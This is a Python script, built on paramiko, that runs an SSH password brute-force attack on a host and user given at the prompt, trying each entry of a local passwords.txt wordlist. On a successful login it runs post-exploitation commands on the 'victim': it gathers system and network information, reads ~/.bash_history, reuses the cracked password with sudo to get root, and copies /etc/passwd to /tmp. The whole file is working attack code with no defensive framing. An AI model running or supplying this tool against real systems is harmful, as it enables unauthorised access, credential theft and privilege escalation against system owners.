import paramiko
import os
import sys  # Import sys to handle exit
import time  # Import time for adding delays

def execute_commands_on_victim(client, password):
    try:
        stdin, stdout, stderr = client.exec_command('whoami')
        current_user = stdout.read().decode().strip()
        print(f"Current User: {current_user}")

        print("\n[+] Gathering system information...")
        stdin, stdout, stderr = client.exec_command('uname -a')
        system_info = stdout.read().decode()
        print(f"System Info: {system_info}")

        print("\n[+] Checking hostname...")
        stdin, stdout, stderr = client.exec_command('hostname')
        hostname = stdout.read().decode()
        print(f"Hostname: {hostname}")

        print("\n[+] Listing files in the home directory...")
        stdin, stdout, stderr = client.exec_command('ls -la ~')
        home_files = stdout.read().decode()
        print(f"Home Directory Files:\n{home_files}")

        print("\n[+] Attempting to read .bash_history...")
        stdin, stdout, stderr = client.exec_command('cat ~/.bash_history')
        bash_history = stdout.read().decode()
        print(f".bash_history:\n{bash_history}")

        print("\n[+] Checking network configuration...")
        stdin, stdout, stderr = client.exec_command('ifconfig')
        network_info = stdout.read().decode()
        print(f"Network Info:\n{network_info}")

        print("\n[+] Attempting to gain root access...")

        if 'root' in current_user:
            print("[+] Already running as root.")
        else:
            stdin, stdout, stderr = client.exec_command('sudo -S -p "" echo "Root access granted"')
            stdin.write(password + '\n')
            stdin.flush()
            sudo_result = stdout.read().decode()

            if "Root access granted" in sudo_result:
                print("[+] Root access granted.")
                print("\n[+] Copying sensitive files as root...")
                stdin, stdout, stderr = client.exec_command('sudo cp /etc/passwd /tmp/passwd_copy')
                stdout.read()  # Ensure the command runs
                print("[+] /etc/passwd copied to /tmp/passwd_copy")
            else:
                print("[!] Root access denied or incorrect password for sudo.")

    except Exception as e:
        print(f"[!] An error occurred during command execution: {e}")

# Main function to handle the brute-force attack
def main():
    print("Starting Common Brute Force Attack...")
    
    host = input("Enter the target host IP: ")
    username = input("Enter the target username: ")
    password_file_path = os.path.join(os.path.dirname(__file__), 'passwords.txt')

    # Check if the password file exists
    if not os.path.isfile(password_file_path):
        print(f"[!] The file '{password_file_path}' does not exist. Exiting.")
        return

    attempts = 0
    successful_password = None

    # Attempt to connect using each password from the list
    with open(password_file_path, "r") as password_list:
        for password in password_list:
            password = password.strip()
            print(f"Trying password: {password}")
            try:
                print(f"[{attempts}] Attempting Password: {password}")
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(hostname=host, username=username, password=password, timeout=1)
                
                print(f"[+] Connected with Password {password}")
                successful_password = password
                execute_commands_on_victim(client, successful_password)
                client.close()
                break
            except paramiko.ssh_exception.AuthenticationException:
                print("Authentication failed.")
            except Exception as e:
                print(f"An error occurred: {e}")
            attempts += 1

    print("Common Brute Force Attack Completed.")
    time.sleep(2)  # Adding delay to observe the output

if __name__ == "__main__":
    main()
